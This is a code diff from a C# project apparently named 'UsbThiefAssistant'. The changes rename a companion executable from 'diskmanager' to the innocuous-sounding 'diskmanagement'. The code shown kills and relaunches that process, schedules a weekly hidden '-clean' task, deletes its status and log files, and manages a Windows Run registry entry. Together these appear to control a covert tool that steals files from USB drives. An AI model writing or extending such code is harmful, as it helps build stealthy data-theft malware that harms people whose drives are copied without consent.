@@ -53,7 +53,7 @@ namespace UsbThiefAssistant
                 Process[] pro = Process.GetProcesses();
                 foreach (var item in pro)
                 {
-                    if (item.ProcessName == "diskmanager")
+                    if (item.ProcessName == "diskmanagement")
                     {
                         item.Kill();
                     }
@@ -160,7 +160,7 @@ namespace UsbThiefAssistant
                 {
                     TaskService.Instance.AddTask("FileAssistant", new WeeklyTrigger { DaysOfWeek = DaysOfTheWeek.Friday, StartBoundary = DateTime.Parse("2019-09-27 09:00") }, new ExecAction { Path = "\"" + Application.ExecutablePath + "\"", Arguments = "-clean" });
                 }
-                Process.Start(path + "\\diskmanager.exe", "-run");
+                Process.Start(path + "\\diskmanagement.exe", "-run");
             }
             catch (Exception)
             {
@@ -176,7 +176,7 @@ namespace UsbThiefAssistant
                     File.Delete(path + "\\status");
                 if (File.Exists(path + "\\log"))
                     File.Delete(path + "\\log");
-                Process.Start(path + "\\diskmanager.exe", "-run");
+                Process.Start(path + "\\diskmanagement.exe", "-run");
             }
             catch (Exception)
             {
@@ -188,9 +188,9 @@ namespace UsbThiefAssistant
             {
                 RegistryKey rk = Registry.CurrentUser;
                 RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
-                if (rk2.GetValue("Disk Manager") != null)
+                if (rk2.GetValue("FileAssistant") != null)
                 {
-                    rk2.DeleteValue("Disk Manager");
+                    rk2.DeleteValue("FileAssistant");
                 }
                 rk2.Close();
                 rk.Close();
